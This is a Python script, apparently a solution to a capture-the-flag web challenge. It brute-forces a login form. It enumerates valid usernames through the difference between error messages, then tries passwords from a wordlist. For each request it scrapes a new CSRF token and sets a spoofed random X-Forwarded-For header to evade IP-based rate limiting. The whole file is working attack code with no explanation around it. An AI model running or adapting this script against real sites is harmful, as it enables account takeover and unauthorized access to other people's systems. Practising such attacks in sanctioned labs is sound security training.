import requests
import random
from bs4 import BeautifulSoup

siteurl = "http://www.vulncommerce.co.uk/login?session_id=xxx"
ctfchallenge_cookie = {'ctfchallenge': 'xxx'}
burp_proxy = {'http': 'http://127.0.0.1:8080'}
usernames = '/usr/share/wordlists/ctfchallenge/usernames.txt'
passwords = '/usr/share/wordlists/ctfchallenge/passwords-large.txt'

def getCSRFToken():
    r = requests.get(siteurl, cookies=ctfchallenge_cookie, proxies=burp_proxy, headers= {'X-Forwarded-For': generateRandomIP()})
    html = BeautifulSoup(r.text, 'html.parser')
    return html.find('input', {'name':'csrf'}).attrs['value']

def findUsername():
    with open(usernames, 'r') as users:
        formData = {'login_username' : '{}', 'login_password': 'aaa'}
        return login(users, formData, "Username not recognised")

def findPassword(username):
    with open(passwords, 'r') as pwords:
        formData = {'login_username': username, 'login_password': '{}'}
        return login(pwords, formData, "Password incorrect for username")

def login(wordList, formData, failureText):
    for word in wordList:
        word = word.rstrip()
        formData['csrf'] = getCSRFToken()
        prevUser = formData['login_username']
        prevPassword = formData['login_password']
        formData['login_username'] = formData['login_username'].format(word)
        formData['login_password'] = formData['login_password'].format(word)
        r = requests.post(siteurl, cookies=ctfchallenge_cookie, data=formData, proxies= {'http': 'http://127.0.0.1:8080'}, headers= {'X-Forwarded-For': generateRandomIP()})
        if failureText not in r.text:
            return word
        formData['login_username'] = prevUser
        formData['login_password'] = prevPassword

def generateRandomIP():
    return f"94.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"


username = findUsername()
password = findPassword(username)
print(f"Username is {username}")
print(f"Password is {password}")
